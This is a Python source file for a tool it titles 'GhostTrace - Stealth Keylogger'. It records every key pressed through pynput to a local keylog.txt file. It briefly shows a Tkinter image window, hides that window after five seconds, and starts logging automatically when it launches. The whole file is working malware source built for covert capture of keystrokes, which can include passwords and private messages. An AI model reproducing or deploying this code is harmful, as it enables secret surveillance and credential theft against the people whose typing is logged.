import tkinter as tk
from PIL import Image, ImageTk  # Import Image and ImageTk from Pillow
from pynput.keyboard import Listener
import threading

# Global variables
keylogger_active = False
log_file_path = "keylog.txt"  # Log file for keystrokes
listener = None

# Function to log keystrokes
def log_keystrokes(key):
    key = str(key).replace("'", "")
    
    # Define allowed characters: letters, numbers, punctuation, and space
    allowed_characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 .,?!:;\'\"!@#$%^&*<>"

    # Handle special keys like space and enter
    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.esc':  # Stop the keylogger on pressing Esc
        stop_keylogger()
    
    # Log only allowed characters
    if key in allowed_characters:
        if keylogger_active:
            with open(log_file_path, "a") as log_file:
                log_file.write(key)

# Start the keylogger in a separate thread
def start_keylogger():
    global keylogger_active, listener
    keylogger_active = True

    # Start listening for keystrokes
    listener = Listener(on_press=log_keystrokes)
    listener.start()

# Stop the keylogger
def stop_keylogger():
    global keylogger_active, listener
    keylogger_active = False
    if listener:
        listener.stop()  # Stop the listener when the Esc key is pressed
    print("GhostTrace keylogger stopped.")

# Function to hide the GUI
def hide_window():
    window.withdraw()  # Hide the window

# GUI setup (will be hidden after 5 seconds)
def create_gui():
    global window
    window = tk.Tk()
    window.title("GhostTrace - Stealth Keylogger")
    window.geometry("400x300")  # Set window size
    window.configure(bg="gray20")

    # Load and set the new image using Pillow
    image = Image.open("gt.jpeg")  # Load the new image file
    
    # Resize the image to fit the window size (adjust as needed)
    image = image.resize((400, 300), Image.LANCZOS)  # Resize the image to fit perfectly
    photo = ImageTk.PhotoImage(image)  # Convert to PhotoImage for Tkinter

    # Create a frame to hold the image
    frame = tk.Frame(window, bg="gray20")
    frame.pack(pady=0)  # No vertical padding needed for a perfect fit

    # Create a label for the new image
    label_image = tk.Label(frame, image=photo, bg="gray20")
    label_image.image = photo  # Keep a reference to avoid garbage collection
    label_image.grid(row=0, column=0)  # Place image in the grid

    # Hide the window after 5 seconds
    window.after(5000, hide_window)

    # Automatically start the keylogger once the GUI launches
    start_keylogger()

    window.mainloop()

if __name__ == "__main__":
    # Run the GUI and start the keylogger
    threading.Thread(target=create_gui).start()
